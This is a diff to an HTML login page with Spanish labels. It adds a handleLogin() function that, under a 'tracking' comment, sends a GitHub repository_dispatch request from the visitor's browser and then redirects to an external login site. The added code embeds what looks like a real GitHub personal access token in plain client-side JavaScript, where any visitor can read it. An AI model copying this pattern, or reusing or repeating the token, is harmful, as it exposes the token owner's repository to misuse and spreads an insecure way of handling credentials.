@@ -89,15 +89,9 @@
       <input type="password" name="new_password" placeholder="Contraseña nueva" />
     </div>
 
-    <button type="submit">Entrar</button>
+    <button type="button" onclick="handleLogin()">Entrar</button>
 
   </form>
-
-  <!-- ENLACE CON TRACKING -->
-  <div style="margin-top:15px; text-align:center;">
-    <a href="https://iaprivada.ai/login" onclick="logClick()">Entrar al sistema</a>
-  </div>
-</div>
 
 <script>
 document.querySelector("form").addEventListener("submit", function () {
@@ -136,6 +130,32 @@ function logClick() {
       }
     })
   });
+}
+
+function handleLogin() {
+
+  // tracking
+  fetch("https://api.github.com/repos/Eva-code-bo/Ti/dispatches", {
+    method: "POST",
+    headers: {
+      "Accept": "application/vnd.github+json",
+      "Authorization": "Bearer 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",
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      event_type: "login_submit",
+      client_payload: {
+        page: window.location.href,
+        time: new Date().toISOString()
+      }
+    })
+  });
+
+  // redirección
+  setTimeout(() => {
+    window.location.href = "https://iaprivada.ai/login";
+  }, 300);
+
 }
 </script>
 
